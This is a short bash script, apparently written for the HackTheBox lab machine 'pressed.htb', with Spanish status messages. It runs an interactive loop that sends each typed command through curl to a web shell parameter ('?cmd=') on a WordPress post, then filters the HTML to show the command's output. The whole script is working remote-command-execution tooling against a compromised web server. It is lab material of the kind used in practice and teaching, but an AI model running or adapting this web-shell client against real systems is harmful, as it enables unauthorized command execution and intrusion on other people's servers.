#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[+] Saliendo..."
  exit 1
}


#ctrl + c 
trap ctrl_c INT

main_url="http://pressed.htb/index.php/2022/01/28/hello-world/?cmd="

while [ "$command" != "exit" ]; do

  echo -n "$~ " && read -r command
  command="$(echo $command | tr ' ' '+')"
  curl -s -X GET "$main_url$command" | grep "below" -A 100 | grep "<p></p>" -B 100 | grep -vE "<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>|<p></p>";echo


done
